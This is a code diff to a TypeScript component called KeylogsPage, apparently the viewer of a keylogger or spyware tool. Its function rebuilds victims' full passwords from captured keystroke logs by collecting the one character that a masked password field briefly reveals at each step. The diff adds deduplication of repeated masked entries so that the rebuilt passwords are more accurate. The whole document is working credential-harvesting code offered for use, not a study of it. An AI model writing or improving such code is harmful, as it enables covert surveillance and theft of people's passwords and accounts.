@@ -24,10 +24,11 @@ export default function KeylogsPage() {
  * 
  * Logic:
  * 1. Sort chronologically (oldest first)
- * 2. Find sequences that start with plain text followed by dots
- * 3. For each masked entry, extract ONLY the new visible character
- * 4. Skip entries that are ONLY dots (no new char)
- * 5. Combine: plain text + all new chars = full password
+ * 2. Remove duplicates: consecutive entries with same mask pattern (••n ••n -> ••n)
+ * 3. Find sequences that start with plain text followed by dots
+ * 4. For each masked entry, extract ONLY the new visible character
+ * 5. Skip entries that are ONLY dots (no new char)
+ * 6. Combine: plain text + all new chars = full password
  * 
  * Example sequence (chronological):
  * "2", "●", "●8", "●●", "●●4", "●●●", "●●●6", "●●●●", "●●●●3", "●●●●●", "●●●●●9", "●●●●●●"
@@ -41,21 +42,54 @@ function beautifyAppLogs(logs: any[]): { extracted: { text: string, startTime: D
         new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime()
     );
 
+    // Step 1: Remove duplicate masked patterns (same length dots + same last visible char)
+    const deduplicated: any[] = [];
+    let duplicatesRemoved = 0;
+
+    for (let i = 0; i < sorted.length; i++) {
+        const current = sorted[i];
+        const currentText = current.text || '';
+
+        if (i > 0) {
+            const prevText = sorted[i - 1].text || '';
+
+            // Check if both have masks
+            const currentHasMask = currentText.includes('•') || currentText.includes('*') || currentText.includes('●');
+            const prevHasMask = prevText.includes('•') || prevText.includes('*') || prevText.includes('●');
+
+            if (currentHasMask && prevHasMask) {
+                // Count mask chars and get visible chars
+                const currentMaskCount = (currentText.match(/[•*●]/g) || []).length;
+                const prevMaskCount = (prevText.match(/[•*●]/g) || []).length;
+                const currentVisible = currentText.replace(/[•*●]/g, '');
+                const prevVisible = prevText.replace(/[•*●]/g, '');
+
+                // If same mask length AND same visible character(s), it's a duplicate
+                if (currentMaskCount === prevMaskCount && currentVisible === prevVisible) {
+                    duplicatesRemoved++;
+                    continue; // Skip this duplicate
+                }
+            }
+        }
+
+        deduplicated.push(current);
+    }
+
     const extracted: { text: string, startTime: Date, endTime: Date, count: number, isPassword: boolean }[] = [];
     const details: string[] = [];
-    let totalMerged = 0;
+    let totalMerged = duplicatesRemoved;
 
     let i = 0;
-    while (i < sorted.length) {
-        const current = sorted[i];
+    while (i < deduplicated.length) {
+        const current = deduplicated[i];
         const text = current.text || '';
         const hasMask = text.includes('•') || text.includes('*') || text.includes('●');
 
         if (!hasMask) {
             // Plain text - check if next entry starts a password sequence
             const nextIdx = i + 1;
-            if (nextIdx < sorted.length) {
-                const nextText = sorted[nextIdx].text || '';
+            if (nextIdx < deduplicated.length) {
+                const nextText = deduplicated[nextIdx].text || '';
                 const nextHasMask = nextText.includes('•') || nextText.includes('*') || nextText.includes('●');
 
                 if (nextHasMask) {
@@ -67,8 +101,8 @@ function beautifyAppLogs(logs: any[]): { extracted: { text: string, startTime: D
 
                     // Process the masked sequence
                     let j = nextIdx;
-                    while (j < sorted.length) {
-                        const entry = sorted[j];
+                    while (j < deduplicated.length) {
+                        const entry = deduplicated[j];
                         const entryText = entry.text || '';
                         const entryHasMask = entryText.includes('•') || entryText.includes('*') || entryText.includes('●');
 
@@ -118,8 +152,8 @@ function beautifyAppLogs(logs: any[]): { extracted: { text: string, startTime: D
             let count = 0;
 
             let j = i;
-            while (j < sorted.length) {
-                const entry = sorted[j];
+            while (j < deduplicated.length) {
+                const entry = deduplicated[j];
                 const entryText = entry.text || '';
                 const entryHasMask = entryText.includes('•') || entryText.includes('*') || entryText.includes('●');
 
@@ -154,6 +188,11 @@ function beautifyAppLogs(logs: any[]): { extracted: { text: string, startTime: D
         }
 
         i++;
+    }
+
+    // Add info about duplicates removed
+    if (duplicatesRemoved > 0) {
+        details.unshift(`Removed ${duplicatesRemoved} duplicate entries`);
     }
 
     return { extracted, mergedCount: totalMerged, details };
